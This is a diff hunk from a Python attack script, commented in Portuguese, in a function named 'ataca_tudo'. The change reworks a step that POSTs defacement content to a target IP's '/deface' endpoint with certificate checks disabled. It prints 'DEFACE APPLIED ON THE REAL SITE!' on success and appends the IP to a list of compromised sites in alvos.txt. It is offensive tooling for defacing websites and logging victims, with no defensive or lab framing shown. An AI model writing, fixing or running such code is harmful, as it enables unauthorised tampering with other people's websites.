@@ -535,12 +535,20 @@ def ataca_tudo():
             # Depois de aplicar o deface
             with open(deface_file, "r") as f:
                 deface_content = f.read()
+
+            # ===== CORREÇÃO: FORÇAR O IP CORRETO =====
+            url_deface = f"https://{ip_alvo}:{porta_web_real}/deface"
+            print(f"[*] A enviar deface para: {url_deface}")
+
             try:
-                requests.post(f"https://{ip_alvo}:{porta_web_real}/deface",
-                              data=deface_content, verify=False, timeout=5)
-                print("[+] DEFACE APLICADO NO SITE REAL!")
-            except:
-                print("[!] Falha ao aplicar deface no site real")
+                r = requests.post(url_deface, data=deface_content, verify=False, timeout=10)
+                print(f"[*] Resposta: {r.status_code} - {r.text}")
+                if r.status_code == 200:
+                    print("[+] DEFACE APLICADO NO SITE REAL!")
+                else:
+                    print(f"[!] Falha: {r.status_code}")
+            except Exception as e:
+                print(f"[!] Erro: {e}")
             
             with open("alvos.txt", "a") as f:
                 f.write(f"\n[SITE_COMPROMETIDO] {ip_alvo}\n")
